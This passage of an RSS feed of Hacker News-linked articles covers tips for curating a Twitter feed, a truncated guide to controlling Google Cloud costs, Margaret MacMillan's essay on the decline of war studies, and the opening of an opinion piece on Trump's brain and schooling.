<p><img src="https://user-images.githubusercontent.com/32199592/104541200-1599cd80-5647-11eb-8d7f-f89ae517eb81.png" alt="shepherd.jpg"></p><p>The only reason brand accounts exist is to convince you - in obvious or non-obvious ways - that you need their product in some way or the other. 99-100% of brand accounts posts are pure marketing. You do not need them.
It’s like bombarding your own feed with their ads - full time - <em>with your full consent</em>. Especially so if you are already consuming a brand’s product. Why?!</p>
<p>Who should you follow then?</p>
<p>Follow people. Now, you might argue that people themselves can be brands and you are absolutely right - avoid them too. This goes for popular celebrities, sportspeople, singers etc.
Around half the time, you are probably going to see marketing stuff from them as well. Not all are like that of course, apply your judgement. I respect a lot of celebrities but I don’t follow them because I simply don’t need their opinion in my feed - I couldn’t care any less - they are artists, I liked their art, I liked how they performed but that doesn’t mean I like their opinion nor do I need to listen to them on every single issue there is. At the end of the day, including every celebrity or band or anything in your feed just increases the “distraction” score in your feed.</p>
<p>Okay. Brands are out. Brand people are out. What next?</p>
<p>Follow thinkers. Follow do-ers. Follow people who are creating something.</p>
<p>Some follows I would recommend in no particular order:
<a href="https://twitter.com/naval/" target="_blank" rel="noopener noreferrer"> @naval </a>,
<a href="https://twitter.com/nntaleb/" target="_blank" rel="noopener noreferrer"> @nntaleb </a>,
<a href="https://twitter.com/JamesClear/" target="_blank" rel="noopener noreferrer"> @JamesClear </a>,
<a href="https://twitter.com/Kpaxs/" target="_blank" rel="noopener noreferrer">
@Kpaxs </a>,
<a href="https://twitter.com/ArmaniTalks" target="_blank" rel="noopener noreferrer"> @ArmaniTalks </a> ,
<a href="https://twitter.com/EdLatimore" target="_blank" rel="noopener noreferrer"> @EdLatimore </a>,
<a href="https://twitter.com/galjudo" target="_blank" rel="noopener noreferrer"> @galjudo </a>,
<a href="https://twitter.com/david_perell/" target="_blank" rel="noopener noreferrer"> @David_Perell </a>,</p>
<p>This is a subjective list, of course, but the idea remains the same: when you scroll - scroll to think, not to react. The posts/tweets in your feed should stop and make you think. If they enable <em>only</em> a reaction like rage or anxiety - remove it.</p>
<blockquote><div lang="en" dir="ltr"><p>A simple heuristic to clean your social media feed:</p><p>Scroll to think, not to react</p><p>Reduce content that enables only a reaction. <br>Increase content that stops and makes you think.</p></div>— Akhil (@akhlkg) <a href="https://twitter.com/akhlkg/status/1346891698861862913?ref_src=twsrc%5Etfw">January 6, 2021</a></blockquote> 

<p><strong>Tip #2</strong></p>
<p>When something is trending and it doesn’t really matter to you much, mute all the words/hashtags/etc related to it. The “Explore” section in Twitter is a black hole of distractions. Twitter will try to shove you up with random stuff all the time in your feed - but mute/block/ignore them all - this takes conscious effort but is well worth it.</p>
<p><img src="https://user-images.githubusercontent.com/32199592/104541285-5691e200-5647-11eb-93d6-ed60a6cfa293.png" alt="twet.jpg"></p><p>If it's a trending event you do genuinely care about and you must “react” to it - here’s my two step strategy:</p>
<ol>
<li>
<p><strong>Ignore ‘the first wave’</strong></p>
<p>The first wave is the most emotional one. The purpose of the first wave, knowingly or unknowingly, is to polarise. There is no place for rationality in the first wave of posts, trends, articles, etc. You are likely going to see the same type/flavour of content - over and over from all sorts of people which essentially just convey the same thing in different shades of rage. There is nothing against the stream, yet. Mute ‘em all.</p>
</li>
<li>
<p><strong>Assess the aftermath</strong></p>
<p>Once the first wave is gone and the hashtags die, start looking around. This can be anywhere from 1 week to several months depending on the issue. You are searching for truth, so don’t look at the news - if you’re reading articles online, don’t just look at one publisher, read on the same article by different publishers. Remember, each publishing house has a “flavour” of twisting things. An easy way to cancel the bias out is to read from many publishers and see what remains common. Now analyse the common facts - those are the fundamental facts that supposedly happened and anything above that, is just an opinion.</p>
<p>You can also look if the “thinkers” are reacting. If so, see what they are saying.
It takes effort to get to the truth and navigate through the noise, so I don’t end up doing this a lot of times because I simply didn't care about the event as much as I thought. And it looks like I end up doing okay.</p>
</li>
</ol>
<hr>

<p>That’s about it. In theory, you can apply these principles to any social media platform. I tested and developed these on Twitter but the fundamental idea remains the same: <strong>scroll to think, not to react.</strong></p>
<p>And this fundamental idea helped me a lot. Twitter taught me a lot of things that form a core part of who I am now - staying healthy, strength training, mental models, entrepreneurship, making money online, writing.</p>
<p>You can use your distractions to literally change your life - and I really hope you do!</p></div></div>]]>
            </description>
            <link>https://www.akhilkg.me/blog/distractions</link>
            <guid isPermaLink="false">hacker-news-small-sites-25772946</guid>
            <pubDate>Thu, 14 Jan 2021 06:39:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to use Cloud Platforms without losing Sleep]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25772463">thread link</a>) | @sudcha
<br/>
January 13, 2021 | https://sudcha.com/guide-to-cloud/ | <a href="https://web.archive.org/web/*/https://sudcha.com/guide-to-cloud/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <!-- Toc if any -->
    
    
        <center><em></em></center>
    
    
    
    <!-- End Toc -->
    <p>A hands on guide for individual developers, small teams without dedicated SRE or oncall teams to using Cloud services safely.</p>

<h2 id="introduction">Introduction</h2>
<p>About a month ago, I published two blog posts on our company blog sharing one of our stories that form our journey: <a href="https://blog.tomilkieway.com/72k-1/" target="_blank">We burnt $72K and almost went bankrupt</a>. The post was fairly well circulated in the tech community, and inspired me to write a post dedicated to the hacks that help me sleep better at night without having an oncall team to manage all the cloud services.</p>

<p>This post outlines practices I learnt and now practise for keeping a check on Cloud usage, and an attempt to eliminate possibilities of surprises.</p>

<h2 id="disclaimers-">Disclaimers (!)</h2>
<dl>
  <dt>1. If you're capable of hosting everything on your own server(s) ...
  </dt>
  <dd>Congratulations, you're one of the very few who have this knowledge and experience. You know what you're doing and keep it up. Depending on whether you have interest in Cloud platforms, this post may or may not add any value to you.</dd>

  <dt>2. Examples are centric to GCP but fundamentals should apply to all platforms</dt>
  <dd>Although examples in this post are on GCP, I've tried to structure around some fundamental vs. platform features. All cloud services have similar features, but they have different names, prices and usage policies.</dd>

  <dt>3. This is not an exhaustive list</dt>
  <dd>Like everyone, I'm still learning and growing. Below is what I learnt from several mistakes, figuring out solutions on my own and going through every piece of literature online from great kind minds. If you have more tips, feel free to share with me, and I'll be happy to add it to this list.</dd>

  <dt>4. This is a long post</dt>
  <dd>Sorry about it, but there's no way around it. If you find it useful and can't finish in one go, you can always come back to this post.</dd>
</dl>
<hr>

<h2 id="lets-jump-into-it">Let’s jump into it!</h2>
<hr>
<h3 id="1-use-multiple-forms-of-payments-fop-preferably-with-spend-caps">1. Use multiple forms of payments (FOP), preferably with spend caps</h3>
<p>Let’s begin with the simplest yet the most effective fixes.</p>

<center>
<img src="https://sudcha.com/assets/images/use-cloud/credit-card.jpg"><br>
</center>

<ol>
  <li>
    <p><strong>Have spending limits/caps on the forms of payments (FOPs) you use.</strong> 
Most cloud services have a monthly billing except if a threshold spend is reached. If the threshold is reached, the Cloud platforms charge the given account right away. If for some reason, one of your services faulter, the cloud service would directly charge the form of payment (like credit cards) on file, and on non payment, stop the service.</p>

    <p>Ideally the spending limit could be anywhere between 120-150% of the cost you expect to incur given the usage of your platform.</p>

    <p>From what I’ve read, it’s relatively easier to get bill waived off than get a refund. While the suggestions in this post will make sure such situations don’t arise, it’s better to have it set up anyways.</p>

    <blockquote>
      <p>Don’t use your $25,000 no limit credit card while setting up billing for a fresh account.</p>
    </blockquote>
  </li>
  <li>
    <p><strong>Use different FOPs for development and production.</strong><br>
After we messed up in one of our projects, our credit card was declined, and this had several unexpected ripple effects.</p>
    <ul>
      <li>First GCP suspended all our billing accounts tied to the same credit card for a suspect of fraud.</li>
      <li>Second, our bank started suspending all future transaction requests from GCP suspecting fraud.</li>
    </ul>

    <p>Sorting this took several days, and it halted our development cycle. Thankfully we didn’t have a production service back then.</p>

    <p>In an ideal setup, I recommend using one FOP for production account, and another one for dev/test accounts. Never mix these two.</p>
  </li>
</ol>

<p><strong>Note:</strong> <br>
If you’re a solo developer, I highly recommend setting up an LLC or some umbrella that gives your personal assets protection. Doesn’t matter where you live, in recent years this process has become quite standard everywhere in the world, thanks to the entrepreneurial boom.</p>

<p>Some wise people online have suggested setting up a shell company (!). I personally don’t recommend spending time doing this. If you’re building something meaningful, spend all your time making it better in a legit way.</p>

<h3 id="2-setup-service-quotas">2. Setup Service Quotas</h3>
<p>In GCP users can define <a href="https://cloud.google.com/docs/quota">“Quotas”</a> for most services. AWS has similar feature called <a href="https://docs.aws.amazon.com/servicequotas/latest/userguide/intro.html" target="_blank">“Service Quotas”</a>, and I’m sure other providers have this as well.</p>

<p>Depending on type of Quota, some of them can be set for usage per day, per minute or even <em>per user</em> per minute. I don’t really trust the <em>per user</em> quota because who defines “a user”? The others quotas for the most part are fairly reliable.</p>

<blockquote>
  <p>While GCP doesn’t allow auto cut off on billing, it does allow auto cut off based on usage, well at least for most services.</p>
</blockquote>

<p>For any account with billing, when I enable a new service, I first check if there’s a quota, and if there’s one, I set it to really low while getting familiar with the service. A lot of the services are charged per use and setting up this quota also helps in validating the costs that will be incurred on use.</p>

<p>As an example, if I’m testing GCP Adult Image Classifier service, as soon as I enable the service, I would first set the Quota to <strong>100 per day</strong> and then try the codelab provided.</p>

<center>
<img src="https://sudcha.com/assets/images/use-cloud/vision-quota.png"><br>
</center>

<p>If the cloud provider you use neither has auto billing shutoff nor budgets, it should be a big red flag for you to use the service.</p>

<h4 id="some-caveats">Some Caveats</h4>

<ul>
  <li>
    <p><strong>Default Values are counter intuitive!</strong><br>
Most services have a preset default quota of unlimited or some absurd value like 1,000,000. Why? God knows. Maybe GCP engineers never paid attention to it, or they assume each of their users, considerable population of which is students, build apps with million dollar budgets.
Setting quotas is also multi click arduous process probably because they are optimized for large organizations. Don’t fret the extra clicks, it’s worth it.</p>
  </li>
  <li>
    <p><strong>Not all services have Quota limits</strong><br>
For example Firestore Read/Write ops. From engineering standpoint, this is understandable because if the service has to check for quota, how can it be real time?
Don’t assume that every service has a quota.</p>
  </li>
  <li>
    <p><strong>Not all quotas work as advertised</strong><br>
Test each of the quotas before fully relying on them. I found several that <strong>don’t work</strong> and my consults led to bugs with Google. The bugs are not fixed yet, and so if something were to go wrong with those services, they would act as a fall back because it’s an issue on GCP’s side.</p>
  </li>
</ul>

<h3 id="3-cloud-monitoring">3. Cloud Monitoring</h3>
<p>While billing is delayed by about a day, most metrics provided by Cloud platforms are delayed by only a few minutes. For GCP this is called Cloud Monitoring, for AWS it’s called CloudWatch and in Microsoft - Azure Monitor.</p>

<p>These monitoring services are either free for the project services (standard metrics), or available at very, very cheap prices.</p>

<p>Setting up Monitoring wasn’t really in the face when I started using Cloud Services, nor is it generally advertised, but it’s a great feature that everyone should use.</p>

<p><strong>What it allows:</strong></p>
<ul>
  <li>Creating beautiful custom dashboards with usage graphs for the services you care about</li>
  <li>Creating alerts that fire if usage goes beyond a user defined limit. The alerts can be SMS, email and app notifications.</li>
</ul>

<h4 id="how-to-use-monitoring-service">How to use Monitoring service</h4>

<ul>
  <li>
    <p><strong>Set up Alerts</strong><br>
You can also set up alerts that’ll fire emails, text messages and mobile app notifications, all for free. While they may not be of much use while you’re sleeping, they do provide a lot of support while you’re awake.</p>

    <p>Case study from our development cycle:
During development of our first product Announce, one of the engineers on my team developing locally (live build on localhost) accidentally created an infinite loop that led to infinite Firebase read ops for a few minutes. We had a free limited project for development so nothing could go wrong, but the monitoring alerted me and I reached out to the team to see what was up.</p>

    <p>The only down side in this was that we had a very limited quota remaining for the day and the team waited until next day to resume development.</p>
  </li>
  <li>
    <p><strong>Look for spikes</strong></p>
  </li>
</ul>

<center>
<img src="https://sudcha.com/assets/images/use-cloud/spike.png"><br>
<em>Always take the time to explain spikes in usage.</em>
</center>

<p>Most of the graphs may look daunting and it’s probably not worth understanding each and every metric and figure. To simplify your job, just look into anomalies.</p>

<p>After few steady days, your job should be to watch out for spikes in usage as compared to the usage in longer period of time. Set the usage to 6 weeks and see if there is a spike. If there is a spike, it should be explained, say too much local testing, surge in usage, expected triggers etc.</p>

<p>Looking for spikes only takes 2-3 minutes for the dashboard to load, and your job is done. This should be part of daily working routine if you have any service deployed on cloud.</p>

<ul>
  <li>
    <p><strong>Anticipate and Reduce Costs</strong><br>
As the graphs are only a few minutes late, after doing something you can wait for a few minutes to see what resources you consumed. You can also predict costs of something before it shows up in billing.</p>

    <p>Another big advantage is aide in reducing costs! For example, looking at Storage, I understood that GCP was continuously storing build artifacts from <em>each</em> build which took a development project storage that shouldn’t be using anymore than 100MB to 25GB. There are ways to fix this, but as a developer, one must know that this problem exists.</p>
  </li>
</ul>

<center>
<img src="https://sudcha.com/assets/images/use-cloud/spike3.png"><br>
<em>High execution time could mean under allocation of resources, leading to more cost.
</em>
</center>

<p>Another example is memory or CPU consumption from the deployed services. Some graphs can easily tell if you have <strong>over/under allocation</strong> of resources to the services.</p>

<ul>
  <li><strong>Write better Code</strong><br>
These graphs easily show low hanging fruits to optimize code. Maybe your cloud function is going into background processes, or perhaps its timing out due to some other service being called serially (instead of asynchronously).</li>
</ul>

<h3 id="4-use-free-projects">4. Use Free Projects</h3>
<p>Cloud Platforms today provide a lot of free services per project, and there are a <strong>lot of projects that a user can create</strong>. There’s a reason why the systems are set up in such a way. Primary reason, as far as I can think of, is to give enough room for testing and learning about the service.</p>

<p>Firebase and GCP allow more than 10 …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sudcha.com/guide-to-cloud/">https://sudcha.com/guide-to-cloud/</a></em></p>]]>
            </description>
            <link>https://sudcha.com/guide-to-cloud/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25772463</guid>
            <pubDate>Thu, 14 Jan 2021 05:25:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If you want peace, study war]]>
            </title>
            <description>
<![CDATA[
Score 196 | Comments 192 (<a href="https://news.ycombinator.com/item?id=25772365">thread link</a>) | @ascertain
<br/>
January 13, 2021 | https://www.persuasion.community/p/if-you-want-peace-study-war-533 | <a href="https://web.archive.org/web/*/https://www.persuasion.community/p/if-you-want-peace-study-war-533">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fee9f8cb1-eee9-4e69-bce8-d7b52537900a_3896x2568.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fee9f8cb1-eee9-4e69-bce8-d7b52537900a_3896x2568.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/ee9f8cb1-eee9-4e69-bce8-d7b52537900a_3896x2568.jpeg&quot;,&quot;height&quot;:960,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1194587,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p><strong>“War…What is it good for?” </strong>the classic song asks. Many universities agree on the answer: “Absolutely nothing.”</p><p>Although anthropologists and archeologists still wonder why human beings have for so long organized themselves to fight, the study of war in history and political science departments is fading. Senior scholars are retiring and not being replaced, or their posts are allocated to other fields of history. Each year, fewer courses are offered on great conflicts such as the Napoleonic wars, the total wars of the 20th century, and the Cold War. The Second World War, you may hear on campus, “has been done.”</p><p>Yet war remains one of the events—along with revolution, famine, financial collapse and, as we are learning again, pandemics—that change the course of history. In privileged countries, we forget the importance of military conflicts because we have enjoyed the “Long Peace” that followed the Second World War. Other places have not been so fortunate, with wars around the world almost every year since 1945, bringing millions of deaths and creating millions more refugees. Meanwhile, the world’s great powers maintain large military establishments, and still prepare for battle. </p><p>It is as important as ever to understand war—its causes, nature and consequences—and the many ways that conflicts have shaped our societies. The conquering armies that came from the Arabian Peninsula in the 7th century after the Prophet Mohammad’s death created new empires and spread the new religion of Islam across the Middle East, North Africa and the Iberian Peninsula. The Seven Years’ War (1756-1763), a global conflict, laid the foundations for the dominance of the British Empire and the bankruptcy of France, which helped to fuel the French Revolution.&nbsp; </p><p>War can also speed up advances in science and technology that have benefits in peacetime. Think of the development of penicillin, blood transfusions, radar, or the transistor. And war can bring about significant social change, often for the better. The need for mass armies in the 19th and 20th centuries meant that governments had to treat the lower classes better, whether by educating them or by improving public health. In many countries that fought in the two world wars, ruling classes recognized the contributions of women and the working classes, granting them the franchise and introducing social benefits. </p><p>So why do history faculties, which accept the need to study other great forces in history, such as changes in the means of production or systems of belief, shy from war? I suspect that horror at the phenomenon itself has affected universities’ willingness to treat it as a subject for scholarship. Years ago, when I proposed a new course on war and society, an education consultant asked me, “Why don’t you call it peace studies?” </p><p>I have since met with incomprehension, even hostility, when I have pointed out that wars can bring unintended benefits. However much I say that we would not <em>choose</em> to make war in order to improve our societies, I am charged with loving war. Yet nobody would say that the study of imperialism, racism or famine means that we think those are good things.</p><p><strong>The history of war is neglected for other reasons, too. </strong>First, separate histories—of women, emotions, food and the environment, for example—have come along. Quite rightly, room has been made for them in the big and eclectic house that is the study of the past. However, part of the shift away from war studies owes to the quest for “social justice”—intended as a drive for radical change in society at large—that has taken root in many history faculties. </p><p>Here, for example, is how the chair of Historical and Cultural Studies at the Scarborough campus of the University of Toronto, Natalie Rothman, <a href="https://www.utsc.utoronto.ca/hcs/">welcomed students</a> this autumn: “As a department, we have strengthened our resolve to confront racism, colonialism and Islamophobia throughout our curriculum and in our co-curricular initiatives.” The University of Berkeley in California <a href="https://history.berkeley.edu/graduate/prospective-students/admissions">asks prospective graduate students</a> to provide “evidence of how you have come to understand the barriers faced by others, evidence of your academic service to advance equitable access to higher education for women, racial minorities, and individuals from other groups that have been historically underrepresented in higher education, evidence of your research focusing on underserved populations or related issues of inequality, or evidence of your leadership among such groups.” It is hard to quarrel with such goals, but their impact on curriculum has been to <a href="http://www.nytimes.com/2016/08/29/opinion/why-did-we-stop-teaching-political-history.html?smid=em-share">downgrade subjects such as political and military history,</a> which are seen as too focused on elites and complicit with hierarchy and oppression. </p><p>Another factor is that history overall is worryingly in decline as an academic subject. While it remains popular among publishers and readers, enrollments in history majors are significantly down. They have <a href="https://www.historians.org/publications-and-directories/perspectives-on-history/december-2018/the-history-ba-since-the-great-recession-the-2018-aha-majors-report">dropped more than any other major</a> in the humanities—perhaps by as much as <a href="http://www.chronicle.com/article/why-are-students-ditching-the-history-major">one-third</a> in <a href="https://www.insidehighered.com/news/2018/11/27/new-analysis-history-major-data-says-field-new-low-can-it-be-saved">American universities</a> in the past decade. At the University of Toronto, where I am a professor, colleagues fear that history enrollment may be down as much as 50% over the same period. Even in the United Kingdom, where history remains popular among undergraduates, the number of those majoring in history has dropped by about <a href="https://www.economist.com/britain/2019/07/18/the-study-of-history-is-in-decline-in-britain">one-tenth</a> in the past decade. </p><p>Part of the reason is that, given the lingering effects of the 2008 financial crisis and uncertainty over the economy, students and their parents want university courses to lead to jobs. The decline in history students in turn affects university hiring, and the fewer the tenured faculty, the fewer places for the doctoral students who are the future of the profession.&nbsp; </p><p>Faculties and administrators are not necessarily helping matters, reluctant to include popular courses on war in the curriculum, or to support well-established centers for the study of conflict, some of which are being remodeled, such as the Laurier Centre for Military, Strategic and Disarmament Studies, in Waterloo, Ontario, which will focus more on Canadian history; another at the University of Calgary is fading as those who retire are not replaced. This seems to be particularly true of elite universities. War studies remains in better health at military colleges or some second-tier public universities, while schools of public policy are also still teaching military history, strategic studies and diplomatic history. </p><p>But those in other fields stereotype war studies, characterizing it as too narrowly focused on tactics, battles, or “toys for boys,” meaning armaments. If that caricature were ever true, it has not been for decades. The great historian Sir Michael Howard, who pioneered the modern study of war and trained generations of historians, always insisted that what he was doing was to consider wars within their social and political contexts as a part of the great sweep of history, not somehow separate from it. &nbsp;</p><p><strong>My own evidence of the distaste for military and diplomatic history </strong>at North American universities comes from tales exchanged privately among fellow academics. One retired Canadian military historian recounted that his old faculty had asked him how to reverse the collapse in enrollment. He suggested a course in military history, but the response was a flat no. When a university in the Maritime provinces of eastern Canada was offered a fully funded post in naval history a few years ago—a good fit in a port town that had been deeply affected by conflict on the Atlantic—members of the department rejected it. </p><p>Yet, despite the overall downturn in university history programs, we know from course enrollments that students are interested in war, as indeed they are in international relations, when they get the chance to study them: At Yale, Paul Kennedy’s “Military History of the West” attracted large crowds; at Toronto’s Ryerson University, international relations courses are the most popular choices among students.</p><p>I would not suggest that student preference should determine what departments offer. But they should at least be listened to. Much more important is what we, as societies, want our future leaders to know. Political history, diplomatic history and the study of war—they all offer critical warnings and instructive analogies to our times. Social and cultural histories, and history from the bottom up, add to our understanding too. But we need balance, and a sense of how the micro- and macro-histories mesh with each other. </p><p>Do we really want citizens who have so little knowledge of how war helped to shape our values and societies and our world? Do we ever want another president asking, as Donald Trump <a href="https://www.businessinsider.com/trump-pearl-harbor-memorial-tour-john-kelly-stable-genius-2020-1?r=US&amp;IR=T">did</a> during a visit to the Pearl Harbor memorial: “What’s this all about? What’s this a tour of?” </p><p>If we aren’t aware of how wars happen, we may fail to recognize warning signs when the next conflict brews, as it will. </p><p><strong>Margaret MacMillan is a professor of history at the University of Toronto and emeritus professor at the University of Oxford. Her latest book, </strong><em><strong><a href="https://www.penguinrandomhouse.com/books/609692/war-how-conflict-shaped-us-by-margaret-macmillan/">War: How Conflict Shaped Us</a></strong></em><strong>, was among the </strong><em><strong>New York Times</strong></em><strong> 10 Best Books of 2020. </strong></p></div></div>]]>
            </description>
            <link>https://www.persuasion.community/p/if-you-want-peace-study-war-533</link>
            <guid isPermaLink="false">hacker-news-small-sites-25772365</guid>
            <pubDate>Thu, 14 Jan 2021 05:10:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mystery of Donald Trump's Brain]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25772198">thread link</a>) | @rajlego
<br/>
January 13, 2021 | https://supermemo.guru/wiki/Mystery_of_Donald_Trump%27s_brain | <a href="https://web.archive.org/web/*/https://supermemo.guru/wiki/Mystery_of_Donald_Trump%27s_brain">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" lang="en" dir="ltr"><p><small>This article by Dr <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> is part of <a href="https://supermemo.guru/wiki/SuperMemo_Guru" title="SuperMemo Guru">SuperMemo Guru</a> series on memory, learning, creativity, and problem solving.</small>
</p><p><small><b>Date: August 2018</b></small>
</p><p><a href="https://supermemo.guru/wiki/Comments" title="Comments">Comments</a>
</p>



<h2><span id="Introduction">Introduction</span></h2>
<h3><span id="Trump_is_a_product_of_bad_schooling">Trump is a product of bad schooling</span></h3>
<p>Donald Trump is the most erratic president in the US history.
</p><p>If I told you I blame the education system for the emergence of Trump, you would probably first think about the president's own spotty world knowledge. His presidential credentials are not too strong in that department. However, his education is still well above the average. If I added that my claim is not about Trump but about society, your second bet might be placed on the dismal level of education provided by American schools. I would reply that it does not take a genius to differentiate between qualities of Trump, Hillary, Bush or Obama.
</p><p>Education systems around the world are under the assault of critics of all sorts. We keep complaining and the <a href="https://supermemo.guru/wiki/Reform" title="Reform">change is coming</a>. However, there is still a last bastion of schooling that seems pretty resistant: <a href="https://supermemo.guru/wiki/Socialization" title="Socialization">socialization</a>. There is an overwhelming belief that kids get their socialization at school. Even the best homeschoolers or unschoolers have to repeatedly answer the question: "<i>What about socialization?</i>". In this text, I show that <a href="https://supermemo.guru/wiki/Social_groups_in_socialization#Socialization:_Open_and_closed_systems" title="Social groups in socialization">open system socialization</a> would never let Trump emerge as the leader of the world. A tempered version of Trump might still be successful in real estate. He would be more ethical, less bombastic, more knowledgeable, less angry, more tame, etc. In open socialization, Trump would be better, Trump would be less prominent, and Trump would not care about his prominence.
</p><p>We socialize children for readiness in the idealized society. As a result, they are not ready to face dangers of reality. If Donald Trump sparked a nuclear war, I would blame the polished socialization based on polished rules in closed systems such as schools or daycare centers. 
</p>
<p>Instead of preparing children for an idealized society, we should let them adopt freely to real social environments</p>
<h3><span id="Why_should_I_speak_about_Trump.3F">Why should I speak about Trump?</span></h3>
<p>Using Trump's rich twitter feed, many a psychiatrist cannot patiently watch the show without a burning itch to violate the <a href="https://en.wikipedia.org/wiki/Goldwater_rule">Goldwater rule</a>. It is tempting to produce a distance diagnosis from the comfort of one's own keyboard.
</p><p>I am also mystified by Trump's brain and behavior. However, my diagnosis is pretty different from the consensus that seems to emerge in the media. My viewpoint is unique for two reasons. On one hand, my work on memory, learning, creativity, and intelligence provide a unique interpretation for Trump's thinking and his behavior. My knowledge exculpates the president on many counts. On the other hand, my own behavior and personality show some parallels that help me empathetically get into Trump's head. I need to hurry to add that I respect women, honor the truth, value the rich constellation of cultures, and worship science. However, my similarities with Trump go deep into how my brain works, and why it sets us both well apart from the social norm.
</p><p>In the end, I believe my conclusions are pretty important. If I am right, we will know how to handle Trump, and how to prevent future Trumps from becoming troublemakers.
</p>
<h3><span id="Diagnosis_by_media">Diagnosis by media</span></h3>
<p>Hundreds of armchair critics, haters, and homegrown scientists have hypothesized on the reasons for Donald Trump's weirdness. Serious scientists also took on the job of "remote diagnosis" with most of the conclusions drawn from news reports on Trump's behavior and decisions. I respect the Goldwater rule when it comes to serious diagnosis. Barry Goldwater was also "remotely" diagnosed as "unfit to be president". Psychiatrists tried to avoid making wild generalizations ever since. However, there should be no gag order on a free discussion. This is why I do not mind "virtual science at a distance". I like hypotheses and models, even if <a href="https://supermemo.guru/wiki/What%27s_the_value_of_wrong_models%3F" title="What's the value of wrong models?">they are wrong</a>. Luckily, I am no psychiatrist, and I need not worry about my license and reputation.
</p><p>In wild hypothesizing, Trump is a particularly interesting case because he makes news daily, and so do critics who bring forward a whole array of mental diseases and cognitive impairments. My interest in Trump's brain comes from the fact that my job provides an entirely different perspective, and to the chagrin of all antagonists, I must say that I see no signs of serious pathology. Just the opposite, Trump's brain is pretty good a specimen that many should envy. A good brain does not prevent committing abhorrent acts such as "<a href="https://www.bbc.com/news/world-us-canada-44518942">putting kids in cages</a>" (compare: <a href="https://supermemo.guru/wiki/Would_you_have_a_heart_to_cage_a_puppy%3F" title="Would you have a heart to cage a puppy?">Putting puppies in cages</a>). The trick to a well-organized society is to find ways to employ good brains for a good cause. I see a couple of reasons why this is not the case for Trump.
</p>
<h3><span id="When_Goldwater_rule_does_not_apply">When Goldwater rule does not apply</span></h3>
<p>Sharon Begley argues the pros and cons of the Goldwater rule in her article "<a href="http://www.statnews.com/2017/12/06/goldwater-rule-psychiatry/">Experts challenge the science behind ban on psychiatrists discussing politicians’ mental health</a>".
</p><p>If psychiatry is an art, we can often arrive at major differences of opinion. Apparently, personality disorders are particularly affected. Most of all, if Trump's prime diagnosis is <a href="https://en.wikipedia.org/wiki/Narcissistic_personality_disorder">narcisissm</a>, he is a particularly grateful subject for analysis. Here is an excerpt from Begley's argument (shortened):
</p>
<blockquote><div><p>The flaws of psychiatric exams and the usefulness of other data make the Goldwater rule "scientifically indefensible," said Dr. Leonard Glass, a psychiatrist at McLean Hospital and Harvard Medical School. "I sort of believed" that interviews offer the clearest window into someone’s mind, he said.</p><p>"Psychiatrists are taught that if a patient says he has three drinks a day, double that," said Dr Glass. "The psychiatric interview is flawed." His and other psychiatrists’ clinical experience is backed up by studies going back to the <a href="http://www.wpic.pitt.edu/research/biometrics/Publications/Biometrics%20Archives%20PDF/614Spitzer&amp;Fleiss1974.pdf">1970s</a> in which patients were examined by two psychiatrists <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC2990547/">back-to-back</a>. The rate of agreement was so low that "the unreliability of psychiatric diagnosis has been and still is a major problem in psychiatry," researchers concluded. Later studies reported similar discrepancies, especially for <a href="http://onlinelibrary.wiley.com/doi/10.1111/cpsp.12088/abstract">personality disorders</a>, finding that examination-based conclusions by a psychiatrist often <a href="http://psycnet.apa.org/record/2016-39264-001">disagree with</a> assessments in a structured research setting.</p><p>Markers of pathological narcissism — grandiose self-importance, entitlement, exploitativeness, and lack of empathy — can be seen in someone’s public behavior, especially in the case of a public figure whose behavior and speech has been documented in hundreds of hours of TV interviews, speeches, offhand remarks, and tweets, plus the accounts of people who have lived or worked closely with him. This evidence can also be <a href="https://www.ncbi.nlm.nih.gov/pubmed/17629778">more accurate</a> than information from formal examinations.</p></div></blockquote>
<h3><span id="Is_virtual_psychiatric_diagnosis_valid.3F">Is virtual psychiatric diagnosis valid?</span></h3>
<p>I refuse to give up modelling, or speaking about brains, esp. in a situation where important conclusions can be drawn and inspire others. This is also my chance to transmit an important message about the school system. I claim that Trump is a child of modern schooling. In part, schooling might have damaged Trump. But more importantly, schooling damaged the electorate that Trump can now easily play with his social tricks.
</p><p>Secondly, we can't escape semi-professional psychiatric diagnosis and/or hypothesizing. Hillary 2016 was also a subject of wild hypotheses. At some point a strong meme started circulating the net: she suffered a serious brain trauma in a fall. Allegedly, she was no longer fit to be president.
